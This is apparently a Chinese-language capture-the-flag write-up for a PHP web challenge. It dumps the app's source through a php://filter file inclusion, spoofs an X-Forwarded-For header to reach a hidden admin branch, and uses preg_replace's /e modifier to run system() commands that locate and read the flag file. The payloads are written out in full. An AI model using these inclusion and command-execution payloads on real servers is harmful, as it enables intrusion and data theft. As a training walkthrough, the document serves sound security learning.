xman_web_ics05

扫描网址得

>[19:56:55] 200 -    5KB - /index.html                                           
>
>[19:56:55] 200 -    2KB - /index.php 
>
>[19:56:55] 200 -    2KB - /index.php/login/

访问http://111.198.29.45:39337/index.php/login后点击网页上的文字后，url变成

`http://111.198.29.45:39337/index.php/login?page=index`

于是猜测可以php://filter

> http://111.198.29.45:39337/index.php/login?page=php://filter/read=convert.base64-encode/resource=index.php

得到index.php的内容,base64解码后为

```php
<?php
error_reporting(0);

@session_start();
posix_setuid(1000);


?>
<!DOCTYPE HTML>
<html>

<head>
    <meta charset="utf-8">
    <meta name="renderer" content="webkit">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" href="layui/css/layui.css" media="all">
    <title>è®¾å¤ç»´æ¤ä¸­å¿</title>
    <meta charset="utf-8">
</head>

<body>
    <ul class="layui-nav">
        <li class="layui-nav-item layui-this"><a href="?page=index">äºå¹³å°è®¾å¤ç»´æ¤ä¸­å¿</a></li>
    </ul>
    <fieldset class="layui-elem-field layui-field-title" style="margin-top: 30px;">
        <legend>è®¾å¤åè¡¨</legend>
    </fieldset>
    <table class="layui-hide" id="test"></table>
    <script type="text/html" id="switchTpl">
        <!-- è¿éç checked çç¶æåªæ¯æ¼ç¤º -->
        <input type="checkbox" name="sex" value="{{d.id}}" lay-skin="switch" lay-text="å¼|å³" lay-filter="checkDemo" {{ d.id==1 0003 ? 'checked' : '' }}>
    </script>
    <script src="layui/layui.js" charset="utf-8"></script>
    <script>
    layui.use('table', function() {
        var table = layui.table,
            form = layui.form;

        table.render({
            elem: '#test',
            url: '/somrthing.json',
            cellMinWidth: 80,
            cols: [
                [
                    { type: 'numbers' },
                     { type: 'checkbox' },
                     { field: 'id', title: 'ID', width: 100, unresize: true, sort: true },
                     { field: 'name', title: 'è®¾å¤å', templet: '#nameTpl' },
                     { field: 'area', title: 'åºå' },
                     { field: 'status', title: 'ç»´æ¤ç¶æ', minWidth: 120, sort: true },
                     { field: 'check', title: 'è®¾å¤å¼å³', width: 85, templet: '#switchTpl', unresize: true }
                ]
            ],
            page: true
        });
    });
    </script>
    <script>
    layui.use('element', function() {
        var element = layui.element; //å¯¼èªçhoverææãäºçº§èåç­åè½ï¼éè¦ä¾èµelementæ¨¡å
        //çå¬å¯¼èªç¹å»
        element.on('nav(demo)', function(elem) {
            //console.log(elem)
            layer.msg(elem.text());
        });
    });
    </script>

<?php

$page = $_GET[page];

if (isset($page)) {



if (ctype_alnum($page)) {
?>

    <br /><br /><br /><br />
    <div style="text-align:center">
        <p class="lead"><?php echo $page; die();?></p>
    <br /><br /><br /><br />

<?php

}else{

?>
        <br /><br /><br /><br />
        <div style="text-align:center">
            <p class="lead">
                <?php

                if (strpos($page, 'input') > 0) {
                    die();
                }

                if (strpos($page, 'ta:text') > 0) {
                    die();
                }

                if (strpos($page, 'text') > 0) {
                    die();
                }

                if ($page === 'index.php') {
                    die('Ok');
                }
                    include($page);
                    die();
                ?>
        </p>
        <br /><br /><br /><br />

<?php
}}


//æ¹ä¾¿çå®ç°è¾å¥è¾åºçåè½,æ­£å¨å¼åä¸­çåè½ï¼åªè½åé¨äººåæµè¯

if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {

    echo "<br >Welcome My Admin ! <br >";

    $pattern = $_GET[pat];
    $replacement = $_GET[rep];
    $subject = $_GET[sub];

    if (isset($pattern) && isset($replacement) && isset($subject)) {
        preg_replace($pattern, $replacement, $subject);
    }else{
        die();
    }

}
?>

</body>

</html>

```

看见最后有`$_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1'`的判断条件才会调用`preg_replace`函数

**!! preg_replace()函数有漏洞** 见https://www.jb51.net/article/145649.htm

>preg_replace( pattern , replacement , subject ) : 当pattern指明/e标志时 ,preg_replace()会将replacement部分的代码当作PHP代码执行 (简单的说就是将replacement参数值放入eval()结构中)


所以在访问之前先给请求头加上 X-Forwarded-For：127.0.0.1

（具体操作可以是先burpsuite抓包，加上后forward就可以显示在浏览器中）

>GET /index.php HTTP/1.1
>Host: 111.198.29.45:39337
>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
>Referer: http://111.198.29.45:39337/
>Connection: close
>Cookie: PHPSESSID=rj6tgg529u9r3ei026pemdf425
>Upgrade-Insecure-Requests: 1
>Cache-Control: max-age=0
>X-Forwarded-For: 127.0.0.1

界面就多了一行`Welcome My Admin !` 

随后利用preg_replace的漏洞对系统里flag相关文件进行查找

> 111.198.29.45:39337/index.php?pat=/test/e&rep=system('find / -iname flag')&sub=test

得到flag文件的路径

>Welcome My Admin ! 
>/var/www/html/s3chahahaDir/flag

最后

> 111.198.29.45:39337/index.php?pat=/test/e&rep=system('cat/var/www/html/s3chahahaDir/flag/flag.php')&sub=test

>Welcome My Admin ! 
>
><?php $flag = 'cyberpeace{d5affd241d93965bf3d575c7de26c14d}';?>

